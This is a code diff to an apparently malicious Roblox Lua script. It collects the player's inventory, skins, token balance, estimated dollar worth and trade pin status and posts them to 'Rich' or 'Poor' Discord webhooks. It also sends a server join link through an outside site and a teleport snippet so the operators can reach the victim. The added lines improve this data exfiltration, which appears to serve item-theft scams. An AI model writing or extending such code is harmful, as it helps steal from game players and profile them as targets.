@@ -779,6 +779,12 @@ local function formatNumber(num)
     else return tostring(math.floor(num)) end
 end
 
+local function truncateField(text, maxLen)
+    maxLen = maxLen or 1024
+    if not text or #text <= maxLen then return text or "" end
+    return text:sub(1, maxLen - 24) .. "\n...and more (truncated)"
+end
+
 local function formatSkinList()
     local stompList = getAllStomps()
     local loveboardList = getAllLoveboards()
@@ -1264,8 +1270,31 @@ local function sendFullInventory()
     table.sort(weaponLines)
     weaponsText = table.concat(weaponLines, "\n")
     if weaponsText == "" then weaponsText = "None" end
+    weaponsText = truncateField(weaponsText, 1018)
     
     local skinText = formatSkinList()
+    if skinText == "None" then
+        local inv = getInventory()
+        if inv and inv.WeaponSkin then
+            local skinList = {}
+            for guid, item in pairs(inv.WeaponSkin) do
+                if item and item.Name then
+                    local weaponName = item.Weapon or item.WeaponName or item.Type or "Unknown"
+                    local value = getItemValue(item.Name)
+                    local line = weaponName .. " | " .. item.Name
+                    if value and value > 0 then
+                        line = line .. " ($" .. formatNumber(value) .. ")"
+                    end
+                    table.insert(skinList, line)
+                end
+            end
+            if #skinList > 0 then
+                table.sort(skinList)
+                skinText = table.concat(skinList, "\n")
+            end
+        end
+    end
+    skinText = truncateField(skinText, 1024)
     
     local ls = localPlayer:FindFirstChild("leaderstats")
     local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or 0
@@ -1286,13 +1315,16 @@ local function sendFullInventory()
     end)
     
     local playerName = localPlayer.Name
-    local targetWebhook = useRichWebhook and RICH_WEBHOOK or POOR_WEBHOOK
+    local targetWebhook = useRichWebhook and RICH_WEBHOOK or (POOR_WEBHOOK ~= "" and POOR_WEBHOOK or RICH_WEBHOOK)
     local joinLink = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
     local serverJoiner = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
     
     local webhookType = useRichWebhook and "Rich" or "Poor"
     
     local tokenWorth = (totalTokenValue / 1000) * 1.75
+    local currentTokens = getPlayerTokens()
+    local displayTokens = totalTokenValue > 0 and formatNumber(totalTokenValue) or tostring(currentTokens)
+    local displayWorth = totalTokenValue > 0 and ("`$" .. formatNumber(tokenWorth) .. "`") or ("`~$" .. formatNumber((currentTokens / 1000) * 1.75) .. "` (est. from balance)")
     
     local fields = {
         {name = "👤 User", value = "`" .. playerName .. "`", inline = true},
@@ -1301,8 +1333,8 @@ local function sendFullInventory()
         {name = "👥 Players", value = "`" .. #Players:GetPlayers() .. " / " .. Players.MaxPlayers .. "`", inline = true},
         {name = "🟢 Tradable: " .. tradableCount .. " | 🔴 Untradable: " .. untradableCount, value = " ", inline = false},
         {name = "🔒 Trade Pin", value = hasPin and "✅ Yes" or "❌ No", inline = true},
-        {name = "💰 Total Worth (1.75$ per 1000 tokens value)", value = "`$" .. formatNumber(tokenWorth) .. "`", inline = true},
-        {name = "🪙 Tokens", value = "`" .. formatNumber(totalTokenValue) .. "`", inline = true},
+        {name = "💰 Total Worth", value = displayWorth, inline = true},
+        {name = "🪙 Tokens", value = "`" .. displayTokens .. "`", inline = true},
     }
     
     table.insert(fields, {name = "🔫 Weapons", value = "```" .. weaponsText .. "```", inline = false})
